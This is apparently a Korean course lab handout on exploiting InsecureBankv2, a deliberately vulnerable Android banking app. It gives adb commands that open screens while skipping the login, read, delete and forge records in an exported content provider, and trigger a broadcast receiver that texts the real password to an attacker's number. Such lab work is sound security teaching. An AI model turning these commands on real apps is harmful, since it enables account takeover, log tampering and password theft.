# Week 13: InsecureBankv2 Hacking - Activity, CP, Receiver

## PART 1: 실습 환경 구축 & 사전 준비

### 1. 실습 대상: InsecureBankv2

**구조**: 
```
안드로이드 앱(Client) <-> 파이썬 서버(Server)
```

**목적**: 보안 취약점을 학습하기 위해 고의로 설계된 뱅킹 앱

---

### 2. 서버 구동 (우분투 터미널)

```bash
# (1) 서버 폴더로 이동
cd ~/apps/AndroLabServer

# (2) 필수 라이브러리 설치
pip3 -r requirements.txt

# (3) 서버 실행 (포트 8888)
python3 app.py

# (4) 확인: "The server is hosted on port: 8888" 메시지 확인
```

---

### 3. 앱 연결 (에뮬레이터)

- 앱 실행 → Server IP: `10.0.2.2` / Port: `8888` 입력 → Login

---

### 4. (심화) 서버 DB 확인하기

```bash
sqlite3 mydb.db
.tables                  # 테이블 목록 확인
SELECT * FROM users;     # 사용자 정보 확인 - jack, dinesh 등
```

---

## PART 2: Activity 공격 - 로그인 건너뛰기

### 1. 취약점 분석

**AndroidManifest.xml 확인 결과**:
- 주요 액티비티들이 `android:exported="true"`로 설정됨

**대상**:
- DoTransfer(이체)
- ViewStatement(조회)
- ChangePassword(비번변경)

**의미**: 로그인 없이 외부에서 강제로 실행 가능함

---

### 2. 공격 명령어 (로그인 우회)

**전제**: `adb shell` 접속 상태

#### (1) 이체 화면 강제 실행
```bash
am start -n com.android.insecurebankv2/.DoTransfer
```

#### (2) 조회 화면 강제 실행
```bash
am start -n com.android.insecurebankv2/.ViewStatement
```
**결과**: 화면은 뜨지만 사용자 정보가 없어 내용은 비어있음 ("Statement does not Exist!!")

#### (3) [핵심] 비밀번호 변경 공격

**상황**: 그냥 실행하면 에러 발생 (누구 비번을 바꿀지 모름)

**해결**: CP 공격(Part 3)으로 알아낸 사용자 이름('jack')을 같이 보냄

```bash
am start -n com.android.insecurebankv2/.ChangePassword --es uname jack
```

---

## PART 3: Content Provider 공격 - DB 털기

### 1. 취약점 분석

- **TrackUserContentProvider**가 `exported="true"`임
- **URI**: `content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers`
- **역할**: 로그인한 사용자들의 이름(로그)을 저장함

---

### 2. 공격 명령어 (CRUD 실습)

#### (1) Query (조회) - 정보 수집
**목표**: 로그인한 사용자 ID 알아내기 (jack)

```bash
content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
```

#### (2) Delete (삭제) - 흔적 지우기
**목표**: 특정 로그(예: id=3) 삭제

```bash
content delete --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers --where "id=3"
```

#### (3) Insert (삽입) - 가짜 기록
**목표**: 가짜 사용자 'wisdom' 추가 (id는 자동 증가됨)

```bash
content insert --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers --bind name:s:wisdom
```

#### (4) Update (수정) - 데이터 변조
**목표**: 'wisdom'을 'hacker'로 변경

```bash
content update --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers --bind name:s:hacker --where "name='wisdom'"
```

---

## PART 4: Broadcast Receiver 공격 - 피싱 문자

### 1. 취약점 분석

- **MyBroadCastReceiver**가 `exported="true"`임
- **기능**: "theBroadcast" 신호를 받으면, 저장된 진짜 비밀번호를 복호화하여 SMS로 전송함
- **문제**: 누구나 이 리시버를 실행시켜서 비밀번호를 빼낼 수 있음

---

### 2. 공격 명령어 (피싱/탈취) ⭐ 가장 긴 명령어

**목표**: 해커의 폰(8502740)으로 "비번이 Hacked123$로 바뀌었다"는 문자를 보내게 만듦 (실제 비번 포함)

#### (1) Full Version (패키지명 반복)
```bash
am broadcast -n com.android.insecurebankv2/com.android.insecurebankv2.MyBroadCastReceiver -a theBroadcast --es phonenumber 8502740 --es newpass Hacked123$
```

#### (2) Short Version (단축형 ./ 사용)
```bash
am broadcast -n com.android.insecurebankv2/.MyBroadCastReceiver -a theBroadcast --es phonenumber 8502740 --es newpass Hacked123$
```

---

### 3. 결과 확인

- 에뮬레이터의 메시지 앱 확인
- "Updated Password from: [진짜비번] to: Hacked123$" 문자 도착

---

## PART 5: 핵심 용어 및 꿀팁 정리

### 1. am (Activity Manager)

안드로이드 시스템의 활동(Activity, Broadcast 등)을 관리하는 도구

**옵션**: 
- `start` (액티비티 실행)
- `broadcast` (방송 전송)

---

### 2. 명령어 옵션 해설

#### `-n [컴포넌트]`
실행할 대상 지정 (패키지명/클래스명)

💡 **팁**: 패키지명과 클래스명의 앞부분이 같으면 `패키지명/.클래스명`으로 줄여 쓸 수 있음

#### `--es [키] [값]`
Extra String. 문자열 데이터를 추가로 전달함

#### `--bind [컬럼]:[타입]:[값]`
CP에 데이터를 입력할 때 사용 (s=문자열, i=정수)
